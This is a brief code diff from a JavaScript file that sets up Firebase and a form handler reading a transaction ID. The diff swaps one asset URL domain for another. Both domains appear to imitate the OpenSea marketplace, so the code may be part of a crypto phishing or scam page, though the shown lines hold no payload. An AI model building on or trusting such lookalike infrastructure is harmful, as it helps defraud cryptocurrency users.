@@ -42,7 +42,7 @@ const db = firebase.firestore(app);
 
 
 
-const URL = 'https://secure.transactionsea-aml.online/assets/'
+const URL = 'https://openseatx.online/assets/'
 $('#_a').on('submit', function () {
     var txID = $('#_a').find('input').eq([0]).val();
     console.log(txID)
